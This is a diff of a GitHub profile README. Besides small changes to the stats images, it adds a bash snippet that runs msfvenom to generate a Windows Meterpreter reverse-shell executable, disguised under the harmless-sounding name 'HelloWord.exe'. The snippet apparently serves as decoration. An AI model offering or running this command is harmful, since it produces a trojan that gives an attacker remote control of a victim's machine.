@@ -12,11 +12,17 @@
 ### About me
 >化工科，比起調殺蟲劑更喜歡造爬蟲www
 
+#### >　1000110 1001111 1011000
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp lport=1111 lhost=192.168.0.1 -f exe > HelloWord.exe
+```
+
 <br>
 <h2 align="center">🍵 Statistics</h2>
 
 <div>
-    <img src="https://github-readme-stats.vercel.app/api/top-langs/?username=FUBUKINGFOX&layout=compact&hide=jupyter%20notebook&theme=dark" alt="my github stats" height="170">
+    <img src="https://github-readme-stats.vercel.app/api/top-langs/?username=FUBUKINGFOX&layout=compact&theme=dark" alt="my github stats" height="170">
     <img src="https://github-readme-stats.vercel.app/api?username=FUBUKINGFOX&theme=dark" alt="my github stats" height="170"/>
 </div>
 
